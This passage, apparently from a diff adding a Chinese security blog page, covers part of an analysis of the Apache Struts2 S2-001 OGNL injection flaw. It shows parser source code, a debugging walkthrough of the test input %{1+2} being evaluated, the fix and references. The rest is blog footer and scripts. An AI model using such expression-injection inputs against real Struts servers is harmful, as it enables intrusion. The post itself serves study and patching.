= stack.findValue(<span class="keyword">var</span>, asType);</span><br><span class="line">            <span class="keyword">if</span> (evaluator != <span class="keyword">null</span>) &#123;</span><br><span class="line">                o = evaluator.evaluate(o);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String left = expression.substring(<span class="number">0</span>, start);</span><br><span class="line">            String right = expression.substring(end + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (o != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (TextUtils.stringSet(left)) &#123;</span><br><span class="line">                    result = left + o;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result = o;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                    result = result + right;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                expression = left + o + right;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = left + right;</span><br><span class="line">                expression = left + right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一次findValue取出 username的值（%{1+2}），赋值给o，拼接字符串，进入下一轮循环</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426004337.png" alt="image-20210426004337033"></p>
+<p>第二次，通过findVlue计算出值</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426004642.png" alt="image-20210426004642423"></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426004712.png" alt="image-20210426004712522"></p>
+<p>再次循环，此时3不满足Ognl表达式，退出，渲染出页面  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426004823.png" alt="image-20210426004822946"></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426004919.png" alt="image-20210426004919048"></p>
+<h2 id="漏洞补丁"><a href="#漏洞补丁" class="headerlink" title="漏洞补丁"></a>漏洞补丁</h2><p><a target="_blank" rel="noopener" href="http://archive.apache.org/dist/struts/binaries/">http://archive.apache.org/dist/struts/binaries/</a>  </p>
+<p>使用loopCount变量限制递归解析 OGNL 表达式的次数</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210426005757.png" alt="image-20210426005757621"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://lanvnal.com/2020/12/15/s2-001-lou-dong-fen-xi/">JavaWeb安全入门之 S2-001漏洞分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.javatt.com/p/39629">Struts2请求流程和原理（源码解析，运行流程）</a></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="yq1ng 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="yq1ng 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>yq1ng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yq1ng.github.io/z_post/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/" title="Java安全学习之路">http://yq1ng.github.io/z_post/Java安全学习之路/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"><i class="fa fa-tag"></i> Java</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/z_post/ctfshow-sqli-labs%E4%B8%93%E9%A2%98/" rel="prev" title="ctfshow sqli-labs专题">
+      <i class="fa fa-chevron-left"></i> ctfshow sqli-labs专题
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Struts2%E6%9E%B6%E6%9E%84%E5%8F%8A%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">Struts2架构及工作原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%B6%E6%9E%84%E5%9B%BE"><span class="nav-number">2.1.</span> <span class="nav-text">架构图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="nav-number">2.2.</span> <span class="nav-text">运行流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#S2-001"><span class="nav-number">3.</span> <span class="nav-text">S2-001</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.4.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%A1%A5%E4%B8%81"><span class="nav-number">3.5.</span> <span class="nav-text">漏洞补丁</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">3.6.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yq1ng"
+      src="/images/xiaoxin.jpg">
+  <p class="site-author-name" itemprop="name">yq1ng</p>
+  <div class="site-description" itemprop="description">The best way to know your strength is to fight</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yq1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yq1ng" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/weixin_43578492" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43578492" rel="noopener" target="_blank"><i class="heartbeat fa-fw"></i>CSDN</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1578422748@qq.com" title="E-Mail → mailto:1578422748@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=%271578422748++%27&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;&#39;1578422748++&#39;&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      大师傅们'blog
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://m3wsec.github.io/" title="http:&#x2F;&#x2F;m3wsec.github.io&#x2F;" rel="noopener" target="_blank">m3w</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://psyduck0409.github.io/" title="https:&#x2F;&#x2F;psyduck0409.github.io&#x2F;" rel="noopener" target="_blank">DaiDai</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://snowywar.top/" title="http:&#x2F;&#x2F;snowywar.top&#x2F;" rel="noopener" target="_blank">snow</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.y4tacker.top/" title="http:&#x2F;&#x2F;blog.y4tacker.top&#x2F;" rel="noopener" target="_blank">Y4tacker</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.csdn.net/qq_46091464" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_46091464" rel="noopener" target="_blank">Firebasky</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.csdn.net/WFC1006848997" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;WFC1006848997" rel="noopener" target="_blank">spaceman</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/erR0Ratao" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;erR0Ratao" rel="noopener" target="_blank">atao</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/anweilx/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;anweilx&#x2F;" rel="noopener" target="_blank">anweilx</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <script
+  async
+  src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yq1ng</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">363k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">10:04</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+<br />
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("09/27/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+</body>
+</html>
